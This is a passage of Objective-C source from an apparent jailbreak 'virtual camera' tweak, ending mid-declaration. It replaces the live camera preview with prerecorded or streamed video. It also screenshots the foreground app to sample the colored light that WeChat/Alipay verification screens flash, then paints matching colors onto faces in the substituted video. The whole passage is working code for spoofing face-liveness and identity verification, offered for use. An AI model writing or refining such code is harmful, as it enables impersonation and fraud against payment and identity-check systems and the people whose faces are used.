- (void)startColorSampling {
    [_colorSampleTimer invalidate];
    _colorSampleTimer = [NSTimer scheduledTimerWithTimeInterval:1.0/30.0 repeats:YES block:^(NSTimer *t) {
        [self sampleScreenColor];
    }];
}
- (void)stopColorSampling {
    [_colorSampleTimer invalidate];
    _colorSampleTimer = nil;
}
- (void)sampleScreenColor {
    @try {
        // Use UIScreen private API to capture actual device screen (works in SpringBoard)
        // This captures all apps including foreground app, not just SpringBoard windows
        UIImage *snapshot = nil;

        // Method 1: UIScreen private snapshot API (works in SpringBoard to capture foreground app)
        UIScreen *screen = [UIScreen mainScreen];
        SEL extSnapSel = NSSelectorFromString(@"_snapshotIncludingStatusBar:");
        if ([screen respondsToSelector:extSnapSel]) {
            #pragma clang diagnostic push
            #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            snapshot = [screen performSelector:extSnapSel withObject:@(NO)];
            #pragma clang diagnostic pop
        }

        // Method 2: UIApplication private screenshot API
        if (!snapshot) {
            SEL appSnapSel = NSSelectorFromString(@"_screenshot");
            UIApplication *app = [UIApplication sharedApplication];
            if ([app respondsToSelector:appSnapSel]) {
                #pragma clang diagnostic push
                #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                snapshot = [app performSelector:appSnapSel];
                #pragma clang diagnostic pop
            }
        }

        // Method 3: Fallback to capturing SpringBoard window hierarchy
        if (!snapshot) {
            UIWindow *keyWindow = nil;
            for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if ([scene isKindOfClass:[UIWindowScene class]]) {
                    UIWindowScene *ws = (UIWindowScene *)scene;
                    for (UIWindow *w in ws.windows) {
                        if ([w isKindOfClass:[PTWnd class]]) continue;
                        if (w.isKeyWindow || !keyWindow) { keyWindow = w; }
                    }
                    if (keyWindow) break;
                }
            }
            if (!keyWindow) return;
            UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, YES, 0.25);
            [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:NO];
            snapshot = UIGraphicsGetImageFromCurrentImageContext();
            UIGraphicsEndImageContext();
        }

        if (!snapshot) return;

        // Sample screen EDGES where verification platforms show colored light
        // Platforms like WeChat/Alipay show colored borders around the camera view
        CGImageRef cgImg = snapshot.CGImage;
        if (!cgImg) return;
        size_t w = CGImageGetWidth(cgImg);
        size_t h = CGImageGetHeight(cgImg);

        // Sample 4 edge strips (top, bottom, left, right) — 15% width each
        size_t edgeW = w * 15 / 100;
        size_t edgeH = h * 15 / 100;
        CGRect edgeRects[4] = {
            CGRectMake(0, 0, w, edgeH),            // top strip
            CGRectMake(0, h - edgeH, w, edgeH),    // bottom strip
            CGRectMake(0, edgeH, edgeW, h - 2*edgeH),  // left strip
            CGRectMake(w - edgeW, edgeH, edgeW, h - 2*edgeH), // right strip
        };

        CGFloat totalR = 0, totalG = 0, totalB = 0;
        int validSamples = 0;
        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();

        for (int ei = 0; ei < 4; ei++) {
            CGImageRef cropped = CGImageCreateWithImageInRect(cgImg, edgeRects[ei]);
            if (!cropped) continue;
            unsigned char pixel[4] = {0};
            CGContextRef ctx = CGBitmapContextCreate(pixel, 1, 1, 8, 4, cs, kCGImageAlphaPremultipliedLast);
            CGContextDrawImage(ctx, CGRectMake(0, 0, 1, 1), cropped);
            CGContextRelease(ctx);
            CGImageRelease(cropped);

            CGFloat sr = pixel[0] / 255.0, sg = pixel[1] / 255.0, sb = pixel[2] / 255.0;
            CGFloat maxC = MAX(sr, MAX(sg, sb));
            CGFloat minC = MIN(sr, MIN(sg, sb));
            CGFloat sat = (maxC > 0.01) ? (maxC - minC) / maxC : 0;
            // Only count edges with actual color (not gray/white/black)
            if (sat > 0.2 && maxC > 0.25) {
                totalR += sr; totalG += sg; totalB += sb;
                validSamples++;
            }
        }
        CGColorSpaceRelease(cs);

        CGFloat r = 0, g = 0, b = 0;
        if (validSamples > 0) {
            r = totalR / validSamples;
            g = totalG / validSamples;
            b = totalB / validSamples;
        }

        // Apply if we detected meaningful color from edges
        CGFloat maxC = MAX(r, MAX(g, b));
        CGFloat minC = MIN(r, MIN(g, b));
        CGFloat saturation = (maxC > 0.01) ? (maxC - minC) / maxC : 0;

        if (validSamples > 0 && saturation > 0.15 && maxC > 0.2) {
            gInjectR = r;
            gInjectG = g;
            gInjectB = b;
        } else if (validSamples == 0) {
            gInjectR = 0; gInjectG = 0; gInjectB = 0;
        }

        _colorIndicator.backgroundColor = [UIColor colorWithRed:gInjectR green:gInjectG blue:gInjectB alpha:1.0];
        vcam_writeControls();
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"ColorSample error: %@", e]);
    }
}
// ===== Preview Screen =====
- (NSString *)currentVideoPath {
    NSFileManager *fm = [NSFileManager defaultManager];
    // Check current index
    NSString *content = [NSString stringWithContentsOfFile:VCAM_FLAG encoding:NSUTF8StringEncoding error:nil];
    int idx = 0;
    if (content) {
        NSArray *parts = [content componentsSeparatedByString:@","];
        if (parts.count >= 2) idx = [parts[1] intValue];
    }
    if (idx > 0) {
        NSArray *exts = @[@"mp4", @"MP4", @"mov", @"MOV", @"m4v", @"M4V"];
        for (NSString *ext in exts) {
            NSString *p = [NSString stringWithFormat:@"%@/%d.%@", VCAM_DIR, idx, ext];
            if ([fm fileExistsAtPath:p]) return p;
        }
    }
    if ([fm fileExistsAtPath:VCAM_VIDEO]) return VCAM_VIDEO;
    return nil;
}
- (void)showPreview {
    if (_pvWindow) { [self closePreview]; return; }

    NSString *videoPath = [self currentVideoPath];
    if (!videoPath) {
        vcam_log(@"Preview: no video source");
        return;
    }

    CGRect sb = [UIScreen mainScreen].bounds;
    CGFloat sw = sb.size.width, sh = sb.size.height;
    CGFloat bw = 45; // border width

    // Get status bar height to avoid covering it
    CGFloat statusBarH = 0;
    UIWindowScene *scene = nil;
    for (UIScene *s in [UIApplication sharedApplication].connectedScenes) {
        if ([s isKindOfClass:[UIWindowScene class]]) { scene = (UIWindowScene *)s; break; }
    }
    if (scene) {
        statusBarH = scene.statusBarManager.statusBarFrame.size.height;
    }
    if (statusBarH < 20) statusBarH = 44; // safe default for notched iPhones

    // Create preview window below status bar
    _pvWindow = scene ? [[UIWindow alloc] initWithWindowScene:scene]
                      : [[UIWindow alloc] initWithFrame:sb];
    _pvWindow.windowLevel = UIWindowLevelAlert + 200;
    _pvWindow.backgroundColor = [UIColor blackColor];
    UIViewController *pvc = [[UIViewController alloc] init];
    pvc.view.backgroundColor = [UIColor blackColor];
    _pvWindow.rootViewController = pvc;
    CGRect pvFrame = CGRectMake(0, statusBarH, sw, sh - statusBarH);
    _pvWindow.frame = pvFrame;

    // Video area (centered, with border space — shorter to fit sliders)
    CGFloat vidTop = bw;
    CGFloat availH = sh - statusBarH; // available height below status bar
    CGFloat vidH = availH * 0.48;
    CGFloat vidLeft = bw;
    CGFloat vidW = sw - 2 * bw;

    // AVPlayer + layer
    NSURL *url = [NSURL fileURLWithPath:videoPath];
    _pvPlayer = [AVPlayer playerWithURL:url];
    _pvPlayer.actionAtItemEnd = AVPlayerActionAtItemEndNone;
    [[NSNotificationCenter defaultCenter] addObserver:self
        selector:@selector(pvLoop:)
        name:AVPlayerItemDidPlayToEndTimeNotification
        object:_pvPlayer.currentItem];

    _pvPlayerLayer = [AVPlayerLayer playerLayerWithPlayer:_pvPlayer];
    _pvPlayerLayer.frame = CGRectMake(vidLeft, vidTop, vidW, vidH);
    _pvPlayerLayer.videoGravity = AVLayerVideoGravityResizeAspectFill;
    [pvc.view.layer addSublayer:_pvPlayerLayer];
    // Attach video output for face detection (renderInContext doesn't work on AVPlayerLayer)
    NSDictionary *pbAttrs = @{(id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA)};
    _pvVideoOutput = [[AVPlayerItemVideoOutput alloc] initWithPixelBufferAttributes:pbAttrs];
    [_pvPlayer.currentItem addOutput:_pvVideoOutput];
    [_pvPlayer play];

    // Border bars (initially black, colored during test)
    _pvBorderT = [[UIView alloc] initWithFrame:CGRectMake(0, 0, sw, vidTop)];
    _pvBorderB = [[UIView alloc] initWithFrame:CGRectMake(0, vidTop + vidH, sw, bw)];
    _pvBorderL = [[UIView alloc] initWithFrame:CGRectMake(0, vidTop, bw, vidH)];
    _pvBorderR = [[UIView alloc] initWithFrame:CGRectMake(sw - bw, vidTop, bw, vidH)];
    for (UIView *bar in @[_pvBorderT, _pvBorderB, _pvBorderL, _pvBorderR]) {
        bar.backgroundColor = [UIColor blackColor];
        bar.userInteractionEnabled = NO;
        [pvc.view addSubview:bar];
    }

    // Face color overlay (positioned by face detection timer)
    _pvFaceOverlay = [[UIView alloc] initWithFrame:CGRectMake(0, 0, sw, availH)];
    _pvFaceOverlay.backgroundColor = [UIColor clearColor];
    _pvFaceOverlay.userInteractionEnabled = NO;
    _pvFaceOverlay.clipsToBounds = YES;
    _pvFaceOverlay.hidden = YES;
    [pvc.view addSubview:_pvFaceOverlay];
    // Shape layer for face contour mode
    _pvFaceShapeLayer = [CAShapeLayer layer];
    _pvFaceShapeLayer.frame = _pvFaceOverlay.bounds;
    _pvFaceShapeLayer.fillColor = [UIColor clearColor].CGColor;
    _pvFaceShapeLayer.strokeColor = [UIColor clearColor].CGColor;
    [_pvFaceOverlay.layer addSublayer:_pvFaceShapeLayer];

    // 三色测试 button
    CGFloat btnY = vidTop + vidH + bw + 10;
    // [removed] tricolor test button - user requested removal

    // --- Adjustable face color parameters (like Android 23.jpg) ---
    CGFloat ctrlY = btnY;
    CGFloat lblW = 85, sliderLeft = lblW + 10, sliderW = sw - sliderLeft - 60, valW = 48;
    UIFont *ctrlFont = [UIFont systemFontOfSize:13];
    UIColor *lblColor = [UIColor lightGrayColor];

    // 模式选择
    UILabel *modeLbl = [[UILabel alloc] initWithFrame:CGRectMake(10, ctrlY, lblW, 28)];
    modeLbl.text = @"\u6A21\u5F0F\u9009\u62E9"; // 模式选择
    modeLbl.font = ctrlFont; modeLbl.textColor = lblColor;
    [pvc.view addSubview:modeLbl];
    _pvModeCtrl = [[UISegmentedControl alloc] initWithItems:@[@"\u4EBA\u8138\u5F62\u72B6", @"\u692D\u5706\u5F62\u72B6"]]; // 人脸形状, 椭圆形状
    _pvModeCtrl.frame = CGRectMake(sliderLeft, ctrlY, sliderW + valW, 28);
    _pvModeCtrl.selectedSegmentIndex = gInjectMode;
    _pvModeCtrl.selectedSegmentTintColor = [UIColor systemTealColor];
    _pvModeCtrl.backgroundColor = [UIColor colorWithRed:0.3 green:0.3 blue:0.4 alpha:0.8];
    [_pvModeCtrl setTitleTextAttributes:@{NSForegroundColorAttributeName: [UIColor whiteColor]} forState:UIControlStateSelected];
    [_pvModeCtrl setTitleTextAttributes:@{NSForegroundColorAttributeName: [UIColor colorWithWhite:0.85 alpha:1.0]} forState:UIControlStateNormal];
    [_pvModeCtrl addTarget:self action:@selector(pvParamChanged:) forControlEvents:UIControlEventValueChanged];
    [pvc.view addSubview:_pvModeCtrl];
    ctrlY += 34;

    // Create slider rows: 照射强度, 照射直径, X坐标, Y坐标
    NSArray *sliderTitles = @[@"\u7167\u5C04\u5F3A\u5EA6:", @"\u7167\u5C04\u76F4\u5F84:", @"X\u5750\u6807:", @"Y\u5750\u6807:"];
    CGFloat sliderMins[] = { 0.05, 0.1, 0.0, 0.0 };
    CGFloat sliderMaxs[] = { 1.0, 1.0, 1.0, 1.0 };
    CGFloat sliderCurs[] = { gInjectAlpha, gInjectDiameter, gInjectOffX + 0.5, gInjectOffY + 0.5 };
    UISlider *sliders[4]; UILabel *valLbls[4];
    for (int si = 0; si < 4; si++) {
        UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(10, ctrlY, lblW, 26)];
        lbl.text = sliderTitles[si]; lbl.font = ctrlFont; lbl.textColor = lblColor;
        [pvc.view addSubview:lbl];
        sliders[si] = [[UISlider alloc] initWithFrame:CGRectMake(sliderLeft, ctrlY, sliderW, 26)];
        sliders[si].minimumValue = sliderMins[si];
        sliders[si].maximumValue = sliderMaxs[si];
        sliders[si].value = sliderCurs[si];
        sliders[si].minimumTrackTintColor = [UIColor systemTealColor];
        sliders[si].tag = 200 + si;
        [sliders[si] addTarget:self action:@selector(pvParamChanged:) forControlEvents:UIControlEventValueChanged];
        [pvc.view addSubview:sliders[si]];
        valLbls[si] = [[UILabel alloc] initWithFrame:CGRectMake(sliderLeft + sliderW + 4, ctrlY, valW, 26)];
        valLbls[si].font = ctrlFont; valLbls[si].textColor = [UIColor whiteColor];
        valLbls[si].textAlignment = NSTextAlignmentRight;
        valLbls[si].text = [NSString stringWithFormat:@"%d%%", (int)(sliderCurs[si] * 100)];
        [pvc.view addSubview:valLbls[si]];
        ctrlY += 30;
    }
    _pvSliderAlpha = sliders[0]; _pvSliderDiameter = sliders[1];
    _pvSliderOffX = sliders[2]; _pvSliderOffY = sliders[3];
    _pvValAlpha = valLbls[0]; _pvValDiameter = valLbls[1];
    _pvValOffX = valLbls[2]; _pvValOffY = valLbls[3];

    // 关闭预览 button
    UIButton *closeBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    closeBtn.frame = CGRectMake(30, ctrlY + 8, sw - 60, 40);
    closeBtn.layer.cornerRadius = 20;
    closeBtn.backgroundColor = [[UIColor grayColor] colorWithAlphaComponent:0.5];
    [closeBtn setTitle:@"\u5173\u95ED\u9884\u89C8" forState:UIControlStateNormal]; // 关闭预览
    [closeBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    closeBtn.titleLabel.font = [UIFont systemFontOfSize:15];
    [closeBtn addTarget:self action:@selector(closePreview) forControlEvents:UIControlEventTouchUpInside];
    [pvc.view addSubview:closeBtn];

    _pvWindow.hidden = NO;
    // Bring floating window above preview window
    if (_window) _window.windowLevel = UIWindowLevelAlert + 300;
    vcam_log([NSString stringWithFormat:@"Preview opened: %@", [videoPath lastPathComponent]]);
}
- (void)pvLoop:(NSNotification *)n {
    [_pvPlayer seekToTime:kCMTimeZero];
}
- (void)closePreview {
    [_pvTestTimer invalidate]; _pvTestTimer = nil;
    [_pvFaceTimer invalidate]; _pvFaceTimer = nil;
    [[NSNotificationCenter defaultCenter] removeObserver:self
        name:AVPlayerItemDidPlayToEndTimeNotification object:_pvPlayer.currentItem];
    [_pvPlayer pause]; _pvPlayer = nil;
    [_pvPlayerLayer removeFromSuperlayer]; _pvPlayerLayer = nil;
    _pvFaceOverlay = nil;
    [_pvFaceShapeLayer removeFromSuperlayer]; _pvFaceShapeLayer = nil;
    _pvBorderT = nil; _pvBorderB = nil; _pvBorderL = nil; _pvBorderR = nil;
    _pvWindow.hidden = YES;
    _pvWindow = nil;
    _pvVideoOutput = nil;
    _pvTestPhase = 0;
    _pvModeCtrl = nil;
    _pvSliderAlpha = nil; _pvSliderDiameter = nil;
    _pvSliderOffX = nil; _pvSliderOffY = nil;
    _pvValAlpha = nil; _pvValDiameter = nil;
    _pvValOffX = nil; _pvValOffY = nil;
    // Restore floating window level
    if (_window) _window.windowLevel = UIWindowLevelAlert + 100;
    vcam_log(@"Preview closed");
}
- (void)pvParamChanged:(id)sender {
    gInjectMode = (int)_pvModeCtrl.selectedSegmentIndex;
    gInjectAlpha = _pvSliderAlpha.value;
    gInjectDiameter = _pvSliderDiameter.value;
    gInjectOffX = _pvSliderOffX.value - 0.5;  // slider 0~1 → offset -0.5~0.5
    gInjectOffY = _pvSliderOffY.value - 0.5;
    _pvValAlpha.text = [NSString stringWithFormat:@"%d%%", (int)(gInjectAlpha * 100)];
    _pvValDiameter.text = [NSString stringWithFormat:@"%d%%", (int)(gInjectDiameter * 100)];
    _pvValOffX.text = [NSString stringWithFormat:@"%d%%", (int)((gInjectOffX + 0.5) * 100)];
    _pvValOffY.text = [NSString stringWithFormat:@"%d%%", (int)((gInjectOffY + 0.5) * 100)];
    // Update face overlay alpha immediately if test is running
    if (_pvTestTimer) {
        UIColor *baseColor = nil;
        switch ((_pvTestPhase - 1) % 3) {
            case 0: baseColor = [UIColor redColor]; break;
            case 1: baseColor = [UIColor greenColor]; break;
            case 2: baseColor = [UIColor blueColor]; break;
        }
        UIColor *faceColor = [baseColor colorWithAlphaComponent:gInjectAlpha];
        // Both modes use shape layer
        _pvFaceOverlay.backgroundColor = [UIColor clearColor];
        if (_pvFaceShapeLayer) {
            _pvFaceShapeLayer.fillColor = faceColor.CGColor;
        }
    }
    vcam_writeControls();
}
- (void)pvTestTap {
    if (_pvTestTimer) {
        // Stop test
        [_pvTestTimer invalidate]; _pvTestTimer = nil;
        [_pvFaceTimer invalidate]; _pvFaceTimer = nil;
        _pvFaceOverlay.hidden = YES;
        for (UIView *bar in @[_pvBorderT, _pvBorderB, _pvBorderL, _pvBorderR]) {
            bar.backgroundColor = [UIColor blackColor];
        }
        _pvTestPhase = 0;
        vcam_log(@"Preview: color test stopped");
        return;
    }
    // Start test — cycle R→G→B continuously
    _pvTestPhase = 0;
    [self pvAdvanceColor];
    _pvTestTimer = [NSTimer scheduledTimerWithTimeInterval:0.5 repeats:YES block:^(NSTimer *t) {
        [self pvAdvanceColor];
    }];
    // Start face detection timer for overlay positioning
    _pvFaceTimer = [NSTimer scheduledTimerWithTimeInterval:0.15 repeats:YES block:^(NSTimer *t) {
        [self pvUpdateFace];
    }];
    _pvFaceDbgReset = YES; // Reset debug counter for new test cycle
    vcam_log(@"Preview: color test started");
}
- (void)pvAdvanceColor {
    UIColor *color = nil;
    switch (_pvTestPhase % 3) {
        case 0: color = [UIColor redColor]; break;
        case 1: color = [UIColor greenColor]; break;
        case 2: color = [UIColor blueColor]; break;
    }
    _pvTestPhase++;
    for (UIView *bar in @[_pvBorderT, _pvBorderB, _pvBorderL, _pvBorderR]) {
        bar.backgroundColor = color;
    }
    // Face overlay — use user-configured alpha
    UIColor *faceColor = [color colorWithAlphaComponent:gInjectAlpha];
    // Both modes use shape layer for face overlay
    _pvFaceOverlay.backgroundColor = [UIColor clearColor];
    if (_pvFaceShapeLayer) {
        _pvFaceShapeLayer.fillColor = faceColor.CGColor;
    }
}
- (void)pvUpdateFace {
    static int pvDbg = 0;
    static CIDetector *faceDetector = nil;
    if (_pvFaceDbgReset) { pvDbg = 0; _pvFaceDbgReset = NO; }
    @try {
        if (!_pvPlayerLayer || !_pvWindow || !_pvVideoOutput) {
            if (pvDbg++ < 5) vcam_log([NSString stringWithFormat:@"pvUpdateFace: nil check failed pl=%d w=%d vo=%d", _pvPlayerLayer!=nil, _pvWindow!=nil, _pvVideoOutput!=nil]);
            [self pvShowFullScreenOverlay];
            return;
        }

        CMTime ct = _pvPlayer.currentItem.currentTime;
        if (![_pvVideoOutput hasNewPixelBufferForItemTime:ct]) {
            return; // keep previous overlay position, don't flicker
        }
        CVPixelBufferRef pb = [_pvVideoOutput copyPixelBufferForItemTime:ct itemTimeForDisplay:NULL];
        if (!pb) {
            if (pvDbg++ < 5) vcam_log(@"pvUpdateFace: copyPixelBuffer nil");
            return;
        }

        size_t imgW = CVPixelBufferGetWidth(pb);
        size_t imgH = CVPixelBufferGetHeight(pb);
        if (pvDbg < 3) vcam_log([NSString stringWithFormat:@"pvUpdateFace: got frame %zux%zu fmt=%u", imgW, imgH, (unsigned)CVPixelBufferGetPixelFormatType(pb)]);

        CIImage *ciImg = [CIImage imageWithCVPixelBuffer:pb];
        CVPixelBufferRelease(pb);

        if (!ciImg) {
            if (pvDbg++ < 5) vcam_log(@"pvUpdateFace: CIImage nil");
            [self pvShowFullScreenOverlay];
            return;
        }

        // Use CIDetector (works in SpringBoard, unlike Vision which fails with Code=9)
        if (!faceDetector) {
            faceDetector = [CIDetector detectorOfType:CIDetectorTypeFace
                                              context:nil
                                              options:@{CIDetectorAccuracy: CIDetectorAccuracyLow}];
            vcam_log([NSString stringWithFormat:@"pvUpdateFace: CIDetector created: %@", faceDetector ? @"ok" : @"nil"]);
        }

        NSArray *features = [faceDetector featuresInImage:ciImg];
        if (features.count == 0) {
            if (pvDbg++ < 10) vcam_log([NSString stringWithFormat:@"pvUpdateFace: no face (CIDetector, img %zux%zu)", imgW, imgH]);
            [self pvShowFullScreenOverlay];
            return;
        }

        CIFaceFeature *face = features[0];
        // CIFaceFeature.bounds is in image coordinates (origin bottom-left)
        CGRect faceBounds = face.bounds;

        if (pvDbg++ < 20) vcam_log([NSString stringWithFormat:@"pvUpdateFace: face found! bounds=(%.0f,%.0f,%.0f,%.0f) img=%zux%zu",
            faceBounds.origin.x, faceBounds.origin.y, faceBounds.size.width, faceBounds.size.height, imgW, imgH]);

        // Convert image coords → screen coords (AspectFill mapping)
        CGRect layerFrame = _pvPlayerLayer.frame;
        CGFloat layerW = layerFrame.size.width, layerH = layerFrame.size.height;
        CGFloat scaleW = layerW / (CGFloat)imgW, scaleH = layerH / (CGFloat)imgH;
        CGFloat fillScale = MAX(scaleW, scaleH);
        CGFloat renderedW = imgW * fillScale, renderedH = imgH * fillScale;
        CGFloat padX = (renderedW - layerW) * 0.5;
        CGFloat padY = (renderedH - layerH) * 0.5;

        // faceBounds is in image coords (origin=bottom-left), convert to screen (origin=top-left)
        CGFloat fx = faceBounds.origin.x * fillScale - padX + layerFrame.origin.x;
        CGFloat fy = ((CGFloat)imgH - faceBounds.origin.y - faceBounds.size.height) * fillScale - padY + layerFrame.origin.y;
        CGFloat fw = faceBounds.size.width * fillScale;
        CGFloat fh = faceBounds.size.height * fillScale;

        // CIDetector returns square bounds (w==h); real faces are ~1.35x taller than wide
        CGFloat faceAspect = 1.35;
        CGFloat extraH = fh * (faceAspect - 1.0);
        fh = fh * faceAspect;
        fy = fy - extraH * 0.3; // shift up slightly (forehead extends above bbox)

        // Apply diameter and offset controls
        CGFloat diam = gInjectDiameter;
        CGFloat overlayW = fw * diam * 2, overlayH = fh * diam * 2;
        CGFloat cx = fx + fw * 0.5 + gInjectOffX * fw;
        CGFloat cy = fy + fh * 0.5 + gInjectOffY * fh;
        CGRect faceRect = CGRectMake(cx - overlayW * 0.5, cy - overlayH * 0.5, overlayW, overlayH);

        // Mode 0 (face contour): use an approximate face-shaped path
        if (gInjectMode == 0) {
            // Create an egg/face-shaped path based on face rect
            CGRect fullBounds = CGRectMake(0, 0, _pvFaceOverlay.superview.bounds.size.width,
                                                  _pvFaceOverlay.superview.bounds.size.height);
            _pvFaceOverlay.frame = fullBounds;
            _pvFaceShapeLayer.frame = _pvFaceOverlay.bounds;

            // Face-shaped bezier: narrower at forehead, wider at cheeks
            UIBezierPath *path = [UIBezierPath bezierPath];
            CGFloat fcx = faceRect.origin.x + faceRect.size.width * 0.5;
            CGFloat fcy = faceRect.origin.y + faceRect.size.height * 0.5;
            CGFloat hw = faceRect.size.width * 0.5;  // half width
            CGFloat hh = faceRect.size.height * 0.5; // half height
            // Face-shaped bezier: narrow forehead, wide cheeks, pointed chin
            // Top center (forehead)
            [path moveToPoint:CGPointMake(fcx, fcy - hh)];
            // Right forehead → right cheek (forehead is 50% width, cheek is full)
            [path addCurveToPoint:CGPointMake(fcx + hw, fcy - hh * 0.05)
                    controlPoint1:CGPointMake(fcx + hw * 0.5, fcy - hh * 0.95)
                    controlPoint2:CGPointMake(fcx + hw, fcy - hh * 0.5)];
            // Right cheek → chin (chin is 30% width, pointed)
            [path addCurveToPoint:CGPointMake(fcx, fcy + hh)
                    controlPoint1:CGPointMake(fcx + hw, fcy + hh * 0.5)
                    controlPoint2:CGPointMake(fcx + hw * 0.3, fcy + hh * 0.9)];
            // Chin → left cheek
            [path addCurveToPoint:CGPointMake(fcx - hw, fcy - hh * 0.05)
                    controlPoint1:CGPointMake(fcx - hw * 0.3, fcy + hh * 0.9)
                    controlPoint2:CGPointMake(fcx - hw, fcy + hh * 0.5)];
            // Left cheek → forehead
            [path addCurveToPoint:CGPointMake(fcx, fcy - hh)
                    controlPoint1:CGPointMake(fcx - hw, fcy - hh * 0.5)
                    controlPoint2:CGPointMake(fcx - hw * 0.5, fcy - hh * 0.95)];
            [path closePath];

            _pvFaceShapeLayer.path = path.CGPath;
            _pvFaceShapeLayer.hidden = NO;
            _pvFaceOverlay.backgroundColor = [UIColor clearColor];
            _pvFaceOverlay.layer.cornerRadius = 0;
            _pvFaceOverlay.hidden = NO;
            if (pvDbg < 20) vcam_log([NSString stringWithFormat:@"pvUpdateFace: MODE 0 faceShape rect=(%.0f,%.0f,%.0f,%.0f)", faceRect.origin.x, faceRect.origin.y, faceRect.size.width, faceRect.size.height]);
            return;
        }

        // Mode 1 (ellipse): use CAShapeLayer with true ellipse path
        {
            CGRect fullBounds = CGRectMake(0, 0, _pvFaceOverlay.superview.bounds.size.width,
                                                  _pvFaceOverlay.superview.bounds.size.height);
            _pvFaceOverlay.frame = fullBounds;
            _pvFaceShapeLayer.frame = _pvFaceOverlay.bounds;
            UIBezierPath *ellipsePath = [UIBezierPath bezierPathWithOvalInRect:faceRect];
            _pvFaceShapeLayer.path = ellipsePath.CGPath;
            _pvFaceShapeLayer.hidden = NO;
            _pvFaceOverlay.backgroundColor = [UIColor clearColor];
            _pvFaceOverlay.layer.cornerRadius = 0;
            _pvFaceOverlay.hidden = NO;
        }
        if (pvDbg < 20) vcam_log([NSString stringWithFormat:@"pvUpdateFace: MODE 1 ellipse rect=(%.0f,%.0f,%.0f,%.0f)", faceRect.origin.x, faceRect.origin.y, faceRect.size.width, faceRect.size.height]);
    } @catch (NSException *e) {
        _pvFaceOverlay.hidden = YES;
        vcam_log([NSString stringWithFormat:@"pvUpdateFace EXCEPTION: %@ %@", e.name, e.reason]);
    }
}
// Fallback: show overlay covering the full video area when face detection fails
- (void)pvShowFullScreenOverlay {
    if (!_pvPlayerLayer) return;
    CGRect layerFrame = _pvPlayerLayer.frame;
    _pvFaceOverlay.frame = layerFrame;
    _pvFaceOverlay.backgroundColor = [UIColor clearColor];
    _pvFaceOverlay.layer.cornerRadius = 0;
    // Use shape layer with full-screen rect path
    if (_pvFaceShapeLayer) {
        _pvFaceShapeLayer.frame = _pvFaceOverlay.bounds;
        _pvFaceShapeLayer.path = [UIBezierPath bezierPathWithRect:_pvFaceOverlay.bounds].CGPath;
        _pvFaceShapeLayer.hidden = NO;
    }
    _pvFaceOverlay.hidden = NO;
}
- (void)dealloc {
    [_colorSampleTimer invalidate];
    [_pvTestTimer invalidate];
    [_pvFaceTimer invalidate];
}
@end

// --- Overlay ---
@interface OVLay : NSObject
@property (nonatomic, strong) CALayer *layer;
@property (nonatomic, weak) CALayer *previewLayer;
@property (nonatomic, strong) NSTimer *timer;
@property (nonatomic, assign) int failCount;
+ (void)attachTo:(CALayer *)pl;
@end
@implementation OVLay
+ (void)attachTo:(CALayer *)previewLayer {
    @try {
        if (!vcam_isEnabled()) return;
        if (!VCAM_CHK_B()) return;
        OVLay *ex = objc_getAssociatedObject(previewLayer, &kOverlayKey);
        if (ex && ex.layer.superlayer) return;
        if (ex) {
            [ex.timer invalidate]; [ex.layer removeFromSuperlayer];
            @synchronized(gOverlays) { [gOverlays removeObject:ex]; }
        }
        OVLay *ctrl = [[OVLay alloc] init];
        ctrl.previewLayer = previewLayer;
        CALayer *ov = [CALayer layer];
        ov.contentsGravity = kCAGravityResizeAspectFill;
        ov.masksToBounds = YES; ov.hidden = YES;
        ov.zPosition = 9999; // above all Camera app internal layers
        ctrl.layer = ov;
        // Add overlay directly on previewLayer so parent transforms auto-apply
        ov.frame = previewLayer.bounds;
        [previewLayer addSublayer:ov];
        ctrl.timer = [NSTimer scheduledTimerWithTimeInterval:1.0/30.0 repeats:YES block:^(NSTimer *t) {
            @try { [ctrl tick]; } @catch (NSException *e) {}
        }];
        objc_setAssociatedObject(previewLayer, &kOverlayKey, ctrl, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
        @synchronized(gOverlays) { [gOverlays addObject:ctrl]; }
        vcam_log(@"Overlay attached");
    } @catch (NSException *e) {}
}
- (void)tick {
    static int sTickDiag = 0;
    if (!vcam_isEnabled()) { self.layer.hidden = YES; self.failCount = 0; return; }
    CALayer *pl = self.previewLayer; if (!pl) return;
    // Re-attach to previewLayer if needed (overlay removed)
    if (!self.layer.superlayer) {
        @try {
            [pl addSublayer:self.layer];
        } @catch (NSException *e) { return; }
    }
    // Update frame: match previewLayer bounds directly
    @try {
        CGRect plBounds = pl.bounds;
        if (plBounds.size.width > 0 && plBounds.size.height > 0 &&
            !CGRectEqualToRect(self.layer.frame, plBounds))
            self.layer.frame = plBounds;
    } @catch (NSException *e) {}
    CGImageRef img = vcam_nextCGImage();
    if (img) {
        size_t iw = CGImageGetWidth(img), ih = CGImageGetHeight(img);
        if (iw > 0 && ih > 0) {
            self.layer.contents = (__bridge id)img;
            self.layer.hidden = NO; self.failCount = 0;
            if (sTickDiag < 3) {
                sTickDiag++;
                vcam_log([NSString stringWithFormat:@"Overlay tick: img %zux%zu frame=%.0fx%.0f root=%@",
                    iw, ih, self.layer.frame.size.width, self.layer.frame.size.height,
                    self.layer.superlayer.superlayer ? @"inner" : @"window"]);
            }
        } else {
            if (sTickDiag < 3) { sTickDiag++; vcam_log(@"Overlay tick: img 0x0, hiding"); }
            self.failCount++;
        }
        CGImageRelease(img);
    } else {
        self.failCount++;
        if (sTickDiag < 3) { sTickDiag++; vcam_log(@"Overlay tick: img=NULL"); }
        // Hide overlay only if stream truly dead — 60 ticks (~1 sec at 60fps).
        // Was 5 ticks (~80ms) which caused overlay to disappear during brief
        // PC streaming hiccups → user saw 'loading spinner' from real camera.
        if (self.failCount > 60) { self.layer.hidden = YES; self.layer.contents = nil; }
    }
}
- (void)dealloc { [_timer invalidate]; }
@end

// --- MJPEG Stream Receiver ---
@interface MJRcv : NSObject <NSURLSessionDataDelegate>
@property (nonatomic, strong) NSURLSession *session;
@property (nonatomic, strong) NSURLSessionDataTask *task;
